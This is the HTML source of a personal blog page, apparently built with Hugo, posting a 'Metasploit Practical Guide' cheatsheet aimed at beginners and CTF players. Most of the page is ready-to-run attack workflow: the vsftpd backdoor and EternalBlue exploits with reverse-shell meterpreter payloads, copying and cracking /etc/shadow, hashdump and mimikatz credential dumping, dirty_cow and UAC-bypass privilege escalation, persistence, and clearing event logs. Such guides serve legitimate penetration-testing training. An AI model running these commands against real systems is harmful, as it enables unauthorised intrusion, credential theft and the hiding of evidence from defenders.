@@ -1,0 +1,812 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+  <meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>🧨 Metasploit Practical Guide (for Beginners and CTF use) | Gajendra Mahato</title>
+<meta name="keywords" content="metasploit, security-testing, post-exploitation, reverse-shell, payload-generation, nmap, hashdump, penetration-testing, ctf, metasploit-framework, security, web-security, sql-injection, red-teaming, ethical-hacking-community, python-scripting, powershell-reverse-shell, reverse-shell-techniques, shell-encoding, socat, runascs, code-snippets, cross-platform, shell-scripting, jsp, war-file, msfvenom, nodejs-exploitation, file-inclusion, PathTraversal, php-filters, htaccess-exploitation, RFI, php-filter, local-file-inclusion, URL_Encoding, path-traversal, log-poisoning, HTTP, StatusCode, bug-bounty, web-fuzzing, directory-bruteforce, http-status-codes, ffuf, fuzzing, parameter-fuzzing, api-testing, vhost-enum, http-methods, proxy, rate-limiting, content-discovery, ctf-tools, ffuf-tool, metasploit-tutorial, ctf-guide">
+<meta name="description" content="🌐 1.Start Metasploit Console
+sudo systemctl start postgresql
+msfconsole
+Initialize the Metasploit Database (First Time Only)
+msfdb init
+
+🔍 2. Scanning Targets
+Quick Target Discovery
+nmap -sn 10.10.10.0/24
+Full Port &#43; Version Scan (Integrated with Metasploit DB)
+db_nmap -sC -sV -O -Pn 10.10.10.129
+View Discovered Hosts &amp; Services
+hosts
+services
+
+🪡 3. Exploit Search and Module Use
+Search by service name or CVE
+search vsftpd
+search type:exploit name:smb
+Load a Module
+use exploit/unix/ftp/vsftpd_234_backdoor
+Explore Module Info
+info        # Shows full module details (author, platform, options, etc)
+show options   # Required &#43; optional settings (RHOSTS, LHOST, etc)
+show advanced  # Advanced options like threads, timeouts, proxies
+show payloads  # Compatible payloads for this exploit
+
+💡 4. Linux Exploitation Workflow
+Example: FTP Backdoor
+use exploit/unix/ftp/vsftpd_234_backdoor
+set RHOSTS 10.10.10.129
+set payload cmd/unix/interact
+run
+If Shell is Basic: Upgrade
+python3 -c &#39;import pty; pty.spawn(&#34;/bin/bash&#34;)&#39;
+Or Use Web Delivery
+use exploit/multi/script/web_delivery
+set payload linux/x86/meterpreter/reverse_tcp
+set LHOST &lt;your_ip&gt;
+set LPORT 4444
+run
+
+Post-Exploitation (Linux)
+sessions -i 1
+getuid
+sysinfo
+Enumerate OS and Configs
+run post/linux/gather/enum_os
+run post/linux/gather/enum_configs
+Dump Password Hashes
+download /etc/passwd
+download /etc/shadow
+john shadow --wordlist=/usr/share/wordlists/rockyou.txt
+Local Exploit Suggestion
+run post/multi/recon/local_exploit_suggester
+Example Local Root Exploit
+use exploit/linux/local/dirty_cow
+set SESSION 1
+run
+Confirm Root
+id
+whoami
+
+💻 5. Windows Exploitation Workflow
+Example: EternalBlue
+use exploit/windows/smb/ms17_010_eternalblue
+set RHOSTS 10.10.10.130
+set LHOST &lt;your_ip&gt;
+set payload windows/x64/meterpreter/reverse_tcp
+run
+Session Handling
+sessions
+sessions -i 1
+sysinfo
+getuid
+Post-Exploitation (Windows)
+Dump Hashes
+hashdump
+load kiwi
+kiwi_cmd &#34;lsadump::sam&#34;
+Process Migration
+ps
+migrate &lt;pid&gt;
+getpid
+Privilege Escalation
+getsystem
+Or use:">
+<meta name="author" content="">
+<link rel="canonical" href="http://localhost:1313/posts/tipsandtricks/cheatsheets/metasploit-practical-guide-for-beginners-and-ctf-use/">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.343cc480b9ffc8f04ccbe5e968ad674880cab773ec19905e93033065c1e7a804.css" integrity="sha256-NDzEgLn/yPBMy&#43;XpaK1nSIDKt3PsGZBekwMwZcHnqAQ=" rel="preload stylesheet" as="style">
+<link rel="icon" href="http://localhost:1313/favicon.jpg">
+<link rel="icon" type="image/png" sizes="16x16" href="http://localhost:1313/favicon.jpg">
+<link rel="icon" type="image/png" sizes="32x32" href="http://localhost:1313/favicon.jpg">
+<link rel="apple-touch-icon" href="http://localhost:1313/favicon.jpg">
+<link rel="mask-icon" href="http://localhost:1313/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<link rel="alternate" hreflang="en" href="http://localhost:1313/posts/tipsandtricks/cheatsheets/metasploit-practical-guide-for-beginners-and-ctf-use/">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+</noscript>
+<script>
+    if (localStorage.getItem("pref-theme") === "light") {
+        document.querySelector("html").dataset.theme = 'light';
+    }
+
+</script><link rel="stylesheet" href="/css/custom.min.63fa54a2907ef17de5b711b6a3bfab36f6c57ca719c46ce6516cfd0d8ee7b452.css" />
+<link
+    rel="stylesheet"
+    href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css"
+/>
+<link rel="preconnect" href="https://fonts.googleapis.com" />
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+<link
+    href="https://fonts.googleapis.com/css2?family=Inter:ital,opsz,wght@0,14..32,100..900;1,14..32,100..900&family=Rajdhani:wght@300;400;500;600;700&display=swap"
+    rel="stylesheet"
+/>
+<link
+    rel="alternate"
+    type="application/rss+xml"
+    title="Gajendra Mahato"
+    href="http://localhost:1313/index.xml"
+/>
+<meta property="og:url" content="http://localhost:1313/posts/tipsandtricks/cheatsheets/metasploit-practical-guide-for-beginners-and-ctf-use/">
+  <meta property="og:site_name" content="Gajendra Mahato">
+  <meta property="og:title" content="🧨 Metasploit Practical Guide (for Beginners and CTF use)">
+  <meta property="og:description" content="🌐 1.Start Metasploit Console sudo systemctl start postgresql msfconsole Initialize the Metasploit Database (First Time Only) msfdb init 🔍 2. Scanning Targets Quick Target Discovery nmap -sn 10.10.10.0/24 Full Port &#43; Version Scan (Integrated with Metasploit DB) db_nmap -sC -sV -O -Pn 10.10.10.129 View Discovered Hosts &amp; Services hosts services 🪡 3. Exploit Search and Module Use Search by service name or CVE search vsftpd search type:exploit name:smb Load a Module use exploit/unix/ftp/vsftpd_234_backdoor Explore Module Info info # Shows full module details (author, platform, options, etc) show options # Required &#43; optional settings (RHOSTS, LHOST, etc) show advanced # Advanced options like threads, timeouts, proxies show payloads # Compatible payloads for this exploit 💡 4. Linux Exploitation Workflow Example: FTP Backdoor use exploit/unix/ftp/vsftpd_234_backdoor set RHOSTS 10.10.10.129 set payload cmd/unix/interact run If Shell is Basic: Upgrade python3 -c &#39;import pty; pty.spawn(&#34;/bin/bash&#34;)&#39; Or Use Web Delivery use exploit/multi/script/web_delivery set payload linux/x86/meterpreter/reverse_tcp set LHOST &lt;your_ip&gt; set LPORT 4444 run Post-Exploitation (Linux) sessions -i 1 getuid sysinfo Enumerate OS and Configs run post/linux/gather/enum_os run post/linux/gather/enum_configs Dump Password Hashes download /etc/passwd download /etc/shadow john shadow --wordlist=/usr/share/wordlists/rockyou.txt Local Exploit Suggestion run post/multi/recon/local_exploit_suggester Example Local Root Exploit use exploit/linux/local/dirty_cow set SESSION 1 run Confirm Root id whoami 💻 5. Windows Exploitation Workflow Example: EternalBlue use exploit/windows/smb/ms17_010_eternalblue set RHOSTS 10.10.10.130 set LHOST &lt;your_ip&gt; set payload windows/x64/meterpreter/reverse_tcp run Session Handling sessions sessions -i 1 sysinfo getuid Post-Exploitation (Windows) Dump Hashes hashdump load kiwi kiwi_cmd &#34;lsadump::sam&#34; Process Migration ps migrate &lt;pid&gt; getpid Privilege Escalation getsystem Or use:">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2026-01-13T00:00:00+00:00">
+    <meta property="article:modified_time" content="2026-01-13T00:00:00+00:00">
+    <meta property="article:tag" content="Metasploit">
+    <meta property="article:tag" content="Security-Testing">
+    <meta property="article:tag" content="Post-Exploitation">
+    <meta property="article:tag" content="Reverse-Shell">
+    <meta property="article:tag" content="Payload-Generation">
+    <meta property="article:tag" content="Nmap">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="🧨 Metasploit Practical Guide (for Beginners and CTF use)">
+<meta name="twitter:description" content="🌐 1.Start Metasploit Console
+sudo systemctl start postgresql
+msfconsole
+Initialize the Metasploit Database (First Time Only)
+msfdb init
+
+🔍 2. Scanning Targets
+Quick Target Discovery
+nmap -sn 10.10.10.0/24
+Full Port &#43; Version Scan (Integrated with Metasploit DB)
+db_nmap -sC -sV -O -Pn 10.10.10.129
+View Discovered Hosts &amp; Services
+hosts
+services
+
+🪡 3. Exploit Search and Module Use
+Search by service name or CVE
+search vsftpd
+search type:exploit name:smb
+Load a Module
+use exploit/unix/ftp/vsftpd_234_backdoor
+Explore Module Info
+info        # Shows full module details (author, platform, options, etc)
+show options   # Required &#43; optional settings (RHOSTS, LHOST, etc)
+show advanced  # Advanced options like threads, timeouts, proxies
+show payloads  # Compatible payloads for this exploit
+
+💡 4. Linux Exploitation Workflow
+Example: FTP Backdoor
+use exploit/unix/ftp/vsftpd_234_backdoor
+set RHOSTS 10.10.10.129
+set payload cmd/unix/interact
+run
+If Shell is Basic: Upgrade
+python3 -c &#39;import pty; pty.spawn(&#34;/bin/bash&#34;)&#39;
+Or Use Web Delivery
+use exploit/multi/script/web_delivery
+set payload linux/x86/meterpreter/reverse_tcp
+set LHOST &lt;your_ip&gt;
+set LPORT 4444
+run
+
+Post-Exploitation (Linux)
+sessions -i 1
+getuid
+sysinfo
+Enumerate OS and Configs
+run post/linux/gather/enum_os
+run post/linux/gather/enum_configs
+Dump Password Hashes
+download /etc/passwd
+download /etc/shadow
+john shadow --wordlist=/usr/share/wordlists/rockyou.txt
+Local Exploit Suggestion
+run post/multi/recon/local_exploit_suggester
+Example Local Root Exploit
+use exploit/linux/local/dirty_cow
+set SESSION 1
+run
+Confirm Root
+id
+whoami
+
+💻 5. Windows Exploitation Workflow
+Example: EternalBlue
+use exploit/windows/smb/ms17_010_eternalblue
+set RHOSTS 10.10.10.130
+set LHOST &lt;your_ip&gt;
+set payload windows/x64/meterpreter/reverse_tcp
+run
+Session Handling
+sessions
+sessions -i 1
+sysinfo
+getuid
+Post-Exploitation (Windows)
+Dump Hashes
+hashdump
+load kiwi
+kiwi_cmd &#34;lsadump::sam&#34;
+Process Migration
+ps
+migrate &lt;pid&gt;
+getpid
+Privilege Escalation
+getsystem
+Or use:">
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+    {
+      "@type": "ListItem",
+      "position":  1 ,
+      "name": "Posts",
+      "item": "http://localhost:1313/posts/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "Tips \u0026 Tricks",
+      "item": "http://localhost:1313/posts/tipsandtricks/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  3 ,
+      "name": "Cheatsheets",
+      "item": "http://localhost:1313/posts/tipsandtricks/cheatsheets/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  4 ,
+      "name": "🧨 Metasploit Practical Guide (for Beginners and CTF use)",
+      "item": "http://localhost:1313/posts/tipsandtricks/cheatsheets/metasploit-practical-guide-for-beginners-and-ctf-use/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "🧨 Metasploit Practical Guide (for Beginners and CTF use)",
+  "name": "🧨 Metasploit Practical Guide (for Beginners and CTF use)",
+  "description": "🌐 1.Start Metasploit Console sudo systemctl start postgresql msfconsole Initialize the Metasploit Database (First Time Only) msfdb init 🔍 2. Scanning Targets Quick Target Discovery nmap -sn 10.10.10.0/24 Full Port + Version Scan (Integrated with Metasploit DB) db_nmap -sC -sV -O -Pn 10.10.10.129 View Discovered Hosts \u0026amp; Services hosts services 🪡 3. Exploit Search and Module Use Search by service name or CVE search vsftpd search type:exploit name:smb Load a Module use exploit/unix/ftp/vsftpd_234_backdoor Explore Module Info info # Shows full module details (author, platform, options, etc) show options # Required + optional settings (RHOSTS, LHOST, etc) show advanced # Advanced options like threads, timeouts, proxies show payloads # Compatible payloads for this exploit 💡 4. Linux Exploitation Workflow Example: FTP Backdoor use exploit/unix/ftp/vsftpd_234_backdoor set RHOSTS 10.10.10.129 set payload cmd/unix/interact run If Shell is Basic: Upgrade python3 -c \u0026#39;import pty; pty.spawn(\u0026#34;/bin/bash\u0026#34;)\u0026#39; Or Use Web Delivery use exploit/multi/script/web_delivery set payload linux/x86/meterpreter/reverse_tcp set LHOST \u0026lt;your_ip\u0026gt; set LPORT 4444 run Post-Exploitation (Linux) sessions -i 1 getuid sysinfo Enumerate OS and Configs run post/linux/gather/enum_os run post/linux/gather/enum_configs Dump Password Hashes download /etc/passwd download /etc/shadow john shadow --wordlist=/usr/share/wordlists/rockyou.txt Local Exploit Suggestion run post/multi/recon/local_exploit_suggester Example Local Root Exploit use exploit/linux/local/dirty_cow set SESSION 1 run Confirm Root id whoami 💻 5. Windows Exploitation Workflow Example: EternalBlue use exploit/windows/smb/ms17_010_eternalblue set RHOSTS 10.10.10.130 set LHOST \u0026lt;your_ip\u0026gt; set payload windows/x64/meterpreter/reverse_tcp run Session Handling sessions sessions -i 1 sysinfo getuid Post-Exploitation (Windows) Dump Hashes hashdump load kiwi kiwi_cmd \u0026#34;lsadump::sam\u0026#34; Process Migration ps migrate \u0026lt;pid\u0026gt; getpid Privilege Escalation getsystem Or use:\n",
+  "keywords": [
+    "metasploit", "security-testing", "post-exploitation", "reverse-shell", "payload-generation", "nmap", "hashdump", "penetration-testing", "ctf", "metasploit-framework", "security", "web-security", "sql-injection", "red-teaming", "ethical-hacking-community", "python-scripting", "powershell-reverse-shell", "reverse-shell-techniques", "shell-encoding", "socat", "runascs", "code-snippets", "cross-platform", "shell-scripting", "jsp", "war-file", "msfvenom", "nodejs-exploitation", "file-inclusion", "PathTraversal", "php-filters", "htaccess-exploitation", "RFI", "php-filter", "local-file-inclusion", "URL_Encoding", "path-traversal", "log-poisoning", "HTTP", "StatusCode", "bug-bounty", "web-fuzzing", "directory-bruteforce", "http-status-codes", "ffuf", "fuzzing", "parameter-fuzzing", "api-testing", "vhost-enum", "http-methods", "proxy", "rate-limiting", "content-discovery", "ctf-tools", "ffuf-tool", "metasploit-tutorial", "ctf-guide"
+  ],
+  "articleBody": "🌐 1.Start Metasploit Console sudo systemctl start postgresql msfconsole Initialize the Metasploit Database (First Time Only) msfdb init 🔍 2. Scanning Targets Quick Target Discovery nmap -sn 10.10.10.0/24 Full Port + Version Scan (Integrated with Metasploit DB) db_nmap -sC -sV -O -Pn 10.10.10.129 View Discovered Hosts \u0026 Services hosts services 🪡 3. Exploit Search and Module Use Search by service name or CVE search vsftpd search type:exploit name:smb Load a Module use exploit/unix/ftp/vsftpd_234_backdoor Explore Module Info info # Shows full module details (author, platform, options, etc) show options # Required + optional settings (RHOSTS, LHOST, etc) show advanced # Advanced options like threads, timeouts, proxies show payloads # Compatible payloads for this exploit 💡 4. Linux Exploitation Workflow Example: FTP Backdoor use exploit/unix/ftp/vsftpd_234_backdoor set RHOSTS 10.10.10.129 set payload cmd/unix/interact run If Shell is Basic: Upgrade python3 -c 'import pty; pty.spawn(\"/bin/bash\")' Or Use Web Delivery use exploit/multi/script/web_delivery set payload linux/x86/meterpreter/reverse_tcp set LHOST set LPORT 4444 run Post-Exploitation (Linux) sessions -i 1 getuid sysinfo Enumerate OS and Configs run post/linux/gather/enum_os run post/linux/gather/enum_configs Dump Password Hashes download /etc/passwd download /etc/shadow john shadow --wordlist=/usr/share/wordlists/rockyou.txt Local Exploit Suggestion run post/multi/recon/local_exploit_suggester Example Local Root Exploit use exploit/linux/local/dirty_cow set SESSION 1 run Confirm Root id whoami 💻 5. Windows Exploitation Workflow Example: EternalBlue use exploit/windows/smb/ms17_010_eternalblue set RHOSTS 10.10.10.130 set LHOST set payload windows/x64/meterpreter/reverse_tcp run Session Handling sessions sessions -i 1 sysinfo getuid Post-Exploitation (Windows) Dump Hashes hashdump load kiwi kiwi_cmd \"lsadump::sam\" Process Migration ps migrate getpid Privilege Escalation getsystem Or use:\nuse exploit/windows/local/bypassuac set SESSION 1 run Suggested Priv Esc Modules run post/windows/escalate/ms10_015_kitrap0d Credential Dumping kiwi_cmd \"creds_wdigest\" kiwi_cmd \"kerberos::list\" Persistence run persistence -U -i 5 -p 4444 -r Clear Logs clearev 📁 6. Metasploit File Management Upload / Download Files upload evil.exe download C:\\\\Users\\\\Admin\\\\Desktop\\\\flag.txt 🔮 7. Cheatsheet Commands Task Command Start console msfconsole Scan w/ nmap db_nmap -sC -sV List hosts/services hosts, services Search module search Use module use Show options show options, show advanced Show payloads show payloads Run exploit run or exploit Manage sessions sessions -i Hashdump hashdump Post modules run post/... Load Kiwi (mimikatz) load kiwi File actions upload, download Clean logs (Windows) clearev 🚀 Tools + Resources searchsploit: offline exploit search john: password cracking nmap: port scanning linpeas.sh, winpeas.exe: manual privilege escalation LOLBAS: Windows native bin abuse GTFOBins: Linux privilege escalation ",
+  "wordCount" : "386",
+  "inLanguage": "en",
+  "datePublished": "2026-01-13T00:00:00Z",
+  "dateModified": "2026-01-13T00:00:00Z",
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "http://localhost:1313/posts/tipsandtricks/cheatsheets/metasploit-practical-guide-for-beginners-and-ctf-use/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "Gajendra Mahato",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "http://localhost:1313/favicon.jpg"
+    }
+  }
+}
+</script>
+  <style>
+    @media screen and (max-width: 768px) {
+      .mobile-header {
+        display: flex;
+        align-items: center;
+      }
+    }
+
+    .mobile-avatar {
+      width: 40px;
+      height: 40px;
+      border-radius: 50%;
+      margin-right: 10px;
+      object-fit: cover;
+    }
+
+    .mobile-avatar-link {
+      line-height: 0;
+    }
+  </style>
+</head>
+
+<body class="sidebar-layout">
+  <div class="container">
+    <header class="mobile-header">
+      <button class="mobile-menu-btn"><i class="fas fa-bars"></i></button>
+      <a href="http://localhost:1313/" class="mobile-avatar-link">
+        <img src="http://localhost:1313/images/avatar.jpg" alt="Avatar Image" class="mobile-avatar">
+      </a>
+      <a href="http://localhost:1313/">
+        <div>Gajendra Mahato</div>
+      </a>
+      <button class="mobile-search-btn"><i class="fas fa-search"></i>
+      </button>
+    </header>
+
+    
+    <aside class="sidebar">
+      <button class="mobile-close-btn">
+        <i class="fa-solid fa-xmark"></i>
+      </button>
+      <div class="sidebar-header">
+        <a href="http://localhost:1313/" class="avatar-link"><img src="http://localhost:1313/images/avatar.jpg"
+            alt="Avatar Image"></a>
+        <a href="http://localhost:1313/">
+          <div class="name-title">Gajendra Mahato</div>
+        </a>
+        <p>Computer Science Student</p>
+      </div>
+
+
+      <nav class="sidebar-nav">
+        
+        <a href="/" class="">
+          <span class="icon-container"><i class='fa-solid fa-house'></i></span> Home
+        </a>
+        
+        <a href="/about/" class="">
+          <span class="icon-container"><i class='fa-solid fa-user'></i></span> About Me
+        </a>
+        
+        <a href="/posts/" class="">
+          <span class="icon-container"><i class='fa-solid fa-pen-nib'></i></span> Writeups
+        </a>
+        
+        <a href="/portfolio/" class="">
+          <span class="icon-container"><i class='fa-solid fa-briefcase'></i></span> Portfolio
+        </a>
+        
+        <a href="/posts/tipsandtricks/cheatsheets/" class="">
+          <span class="icon-container"><i class='fa-solid fa-book'></i></span> Cheatsheet
+        </a>
+        
+        <a href="/contact/" class="">
+          <span class="icon-container"><i class='fa-solid fa-envelope'></i></span> Contact
+        </a>
+        
+      </nav>
+
+      <div class="sidebar-footer">
+        <a href="https://github.com/NoobGajen" target="_blank"><i class="fab fa-github"></i></a>
+        <a href="https://www.linkedin.com/in/GajendraMahato" target="_blank"><i class="fab fa-linkedin"></i></a>
+        <a href="https://x.com/NoobGajen" target="_blank"><i class="fab fa-twitter"></i></a>
+        <a href="https://tryhackme.com/p/TheLinuxLover" target="_blank"><i class="fas fa-user-secret"></i></i></a>
+        <a href="http://localhost:1313/index.xml" target="_blank">
+          <i class="fa-solid fa-rss"></i>
+        </a>
+      </div>
+    </aside>
+
+    
+    <main class="content">
+      <header class="topnav">
+        <div id="search-container" class="search-container">
+          <span class="absolute left-3 top-2.5 text-gray-400">
+            <i class="fas fa-search"></i>
+          </span>
+          <input id="search-input" type="text" placeholder="Search..."
+            class="w-full border rounded-lg py-2 pl-10 pr-4 focus:outline-none focus:ring-2 focus:ring-blue-500" />
+        </div>
+      </header>
+      <div class="content-container">
+        <div class="inside">
+
+<article class="post-single">
+  <header class="post-header">
+    <div class="breadcrumbs"><a href="http://localhost:1313/">Home</a>&nbsp;»&nbsp;<a href="http://localhost:1313/posts/">Posts</a>&nbsp;»&nbsp;<a href="http://localhost:1313/posts/tipsandtricks/">Tips &amp; Tricks</a>&nbsp;»&nbsp;<a href="http://localhost:1313/posts/tipsandtricks/cheatsheets/">Cheatsheets</a></div>
+    <h1 class="post-title entry-hint-parent">
+      🧨 Metasploit Practical Guide (for Beginners and CTF use)
+    </h1>
+    <div class="post-meta"><span title='2026-01-13 00:00:00 +0000 UTC'>January 13, 2026</span>&nbsp;·&nbsp;<span>2 min</span>
+
+</div>
+  </header> 
+  <div class="post-content"><h1 id="-1start-metasploit-console">🌐 1.Start Metasploit Console<a hidden class="anchor" aria-hidden="true" href="#-1start-metasploit-console">#</a></h1>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sudo systemctl start postgresql
+</span></span><span class="line"><span class="cl">msfconsole
+</span></span></code></pre></div><h2 id="initialize-the-metasploit-database-first-time-only">Initialize the Metasploit Database (First Time Only)<a hidden class="anchor" aria-hidden="true" href="#initialize-the-metasploit-database-first-time-only">#</a></h2>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">msfdb init
+</span></span></code></pre></div><hr>
+<h1 id="-2-scanning-targets">🔍 2. Scanning Targets<a hidden class="anchor" aria-hidden="true" href="#-2-scanning-targets">#</a></h1>
+<h3 id="quick-target-discovery">Quick Target Discovery<a hidden class="anchor" aria-hidden="true" href="#quick-target-discovery">#</a></h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nmap -sn 10.10.10.0/24
+</span></span></code></pre></div><h3 id="full-port--version-scan-integrated-with-metasploit-db">Full Port + Version Scan (Integrated with Metasploit DB)<a hidden class="anchor" aria-hidden="true" href="#full-port--version-scan-integrated-with-metasploit-db">#</a></h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">db_nmap -sC -sV -O -Pn 10.10.10.129
+</span></span></code></pre></div><h3 id="view-discovered-hosts--services">View Discovered Hosts &amp; Services<a hidden class="anchor" aria-hidden="true" href="#view-discovered-hosts--services">#</a></h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">hosts
+</span></span><span class="line"><span class="cl">services
+</span></span></code></pre></div><hr>
+<h1 id="-3-exploit-search-and-module-use">🪡 3. Exploit Search and Module Use<a hidden class="anchor" aria-hidden="true" href="#-3-exploit-search-and-module-use">#</a></h1>
+<h3 id="search-by-service-name-or-cve">Search by service name or CVE<a hidden class="anchor" aria-hidden="true" href="#search-by-service-name-or-cve">#</a></h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">search vsftpd
+</span></span><span class="line"><span class="cl">search type:exploit name:smb
+</span></span></code></pre></div><h3 id="load-a-module">Load a Module<a hidden class="anchor" aria-hidden="true" href="#load-a-module">#</a></h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">use exploit/unix/ftp/vsftpd_234_backdoor
+</span></span></code></pre></div><h3 id="explore-module-info">Explore Module Info<a hidden class="anchor" aria-hidden="true" href="#explore-module-info">#</a></h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">info        <span class="c1"># Shows full module details (author, platform, options, etc)</span>
+</span></span><span class="line"><span class="cl">show options   <span class="c1"># Required + optional settings (RHOSTS, LHOST, etc)</span>
+</span></span><span class="line"><span class="cl">show advanced  <span class="c1"># Advanced options like threads, timeouts, proxies</span>
+</span></span><span class="line"><span class="cl">show payloads  <span class="c1"># Compatible payloads for this exploit</span>
+</span></span></code></pre></div><hr>
+<h1 id="-4-linux-exploitation-workflow">💡 4. Linux Exploitation Workflow<a hidden class="anchor" aria-hidden="true" href="#-4-linux-exploitation-workflow">#</a></h1>
+<h2 id="example-ftp-backdoor">Example: FTP Backdoor<a hidden class="anchor" aria-hidden="true" href="#example-ftp-backdoor">#</a></h2>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">use exploit/unix/ftp/vsftpd_234_backdoor
+</span></span><span class="line"><span class="cl"><span class="nb">set</span> RHOSTS 10.10.10.129
+</span></span><span class="line"><span class="cl"><span class="nb">set</span> payload cmd/unix/interact
+</span></span><span class="line"><span class="cl">run
+</span></span></code></pre></div><h3 id="if-shell-is-basic-upgrade">If Shell is Basic: Upgrade<a hidden class="anchor" aria-hidden="true" href="#if-shell-is-basic-upgrade">#</a></h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">python3 -c <span class="s1">&#39;import pty; pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
+</span></span></code></pre></div><h3 id="or-use-web-delivery">Or Use Web Delivery<a hidden class="anchor" aria-hidden="true" href="#or-use-web-delivery">#</a></h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">use exploit/multi/script/web_delivery
+</span></span><span class="line"><span class="cl"><span class="nb">set</span> payload linux/x86/meterpreter/reverse_tcp
+</span></span><span class="line"><span class="cl"><span class="nb">set</span> LHOST &lt;your_ip&gt;
+</span></span><span class="line"><span class="cl"><span class="nb">set</span> LPORT <span class="m">4444</span>
+</span></span><span class="line"><span class="cl">run
+</span></span></code></pre></div><hr>
+<h2 id="post-exploitation-linux">Post-Exploitation (Linux)<a hidden class="anchor" aria-hidden="true" href="#post-exploitation-linux">#</a></h2>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sessions -i <span class="m">1</span>
+</span></span><span class="line"><span class="cl">getuid
+</span></span><span class="line"><span class="cl">sysinfo
+</span></span></code></pre></div><h3 id="enumerate-os-and-configs">Enumerate OS and Configs<a hidden class="anchor" aria-hidden="true" href="#enumerate-os-and-configs">#</a></h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">run post/linux/gather/enum_os
+</span></span><span class="line"><span class="cl">run post/linux/gather/enum_configs
+</span></span></code></pre></div><h3 id="dump-password-hashes">Dump Password Hashes<a hidden class="anchor" aria-hidden="true" href="#dump-password-hashes">#</a></h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">download /etc/passwd
+</span></span><span class="line"><span class="cl">download /etc/shadow
+</span></span><span class="line"><span class="cl">john shadow --wordlist<span class="o">=</span>/usr/share/wordlists/rockyou.txt
+</span></span></code></pre></div><h3 id="local-exploit-suggestion">Local Exploit Suggestion<a hidden class="anchor" aria-hidden="true" href="#local-exploit-suggestion">#</a></h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">run post/multi/recon/local_exploit_suggester
+</span></span></code></pre></div><h3 id="example-local-root-exploit">Example Local Root Exploit<a hidden class="anchor" aria-hidden="true" href="#example-local-root-exploit">#</a></h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">use exploit/linux/local/dirty_cow
+</span></span><span class="line"><span class="cl"><span class="nb">set</span> SESSION <span class="m">1</span>
+</span></span><span class="line"><span class="cl">run
+</span></span></code></pre></div><h3 id="confirm-root">Confirm Root<a hidden class="anchor" aria-hidden="true" href="#confirm-root">#</a></h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">id
+</span></span><span class="line"><span class="cl">whoami
+</span></span></code></pre></div><hr>
+<h1 id="-5-windows-exploitation-workflow">💻 5. Windows Exploitation Workflow<a hidden class="anchor" aria-hidden="true" href="#-5-windows-exploitation-workflow">#</a></h1>
+<h2 id="example-eternalblue">Example: EternalBlue<a hidden class="anchor" aria-hidden="true" href="#example-eternalblue">#</a></h2>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">use exploit/windows/smb/ms17_010_eternalblue
+</span></span><span class="line"><span class="cl"><span class="nb">set</span> RHOSTS 10.10.10.130
+</span></span><span class="line"><span class="cl"><span class="nb">set</span> LHOST &lt;your_ip&gt;
+</span></span><span class="line"><span class="cl"><span class="nb">set</span> payload windows/x64/meterpreter/reverse_tcp
+</span></span><span class="line"><span class="cl">run
+</span></span></code></pre></div><h3 id="session-handling">Session Handling<a hidden class="anchor" aria-hidden="true" href="#session-handling">#</a></h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sessions
